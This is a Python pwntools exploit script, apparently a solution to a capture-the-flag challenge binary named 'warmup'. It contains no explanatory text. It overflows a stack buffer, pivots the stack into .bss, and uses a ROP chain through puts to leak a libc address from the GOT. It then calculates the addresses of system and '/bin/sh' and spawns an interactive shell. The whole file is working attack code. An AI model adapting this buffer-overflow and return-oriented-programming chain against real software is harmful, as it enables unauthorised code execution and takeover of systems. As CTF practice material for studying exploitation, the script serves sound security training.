from pwn import *

io = process('./warmup')
gdb.attach(io)

def pad(s):
    return s+'X'*(0x80-len(s)-16)

payload = 'A'*(0x70)
payload += p64(0x601500)  #rbp to bss
payload += p64(0x400675)  #rip to read
io.recvuntil('CTF!\n')
io.send(payload)

payload = p64(0x400703)   #pop rdi ; ret 
payload += p64(0x601038)  #setvbuf@got.plt
payload += p64(0x4004e0)  #puts@plt
payload += p64(0x4005a0)  #pop rbp ; ret
payload += p64(0x601800)  #new bss
payload += p64(0x400675)  #rip to read
payload = pad(payload)
payload += p64(0x601488)  #rbp
payload += p64(0x400695)  #leave ; ret 
io.send(payload)

out = io.recv()
fin = out.encode('hex')
final = fin[0:12]
leak =fin[10:12]+fin[8:10]+fin[6:8]+fin[4:6]+fin[2:4]+fin[0:2]
leaked ="0x" +str(leak)
system = hex(int(leaked,16)-0x32870)
binsh =  hex(int(system,16)+0x161133)
log.info('system : {}'.format(system))
log.info('/bin/sh: {}'.format(binsh))

payload = p64(0x400703)   #pop rdi ; ret 
payload += p64(int(binsh,16))
payload += p64(int(system,16))
payload = pad(payload) 
payload += p64(0x601788)  #rbp
payload += p64(0x400695)  #leave ; ret
io.send(payload)



io.interactive()
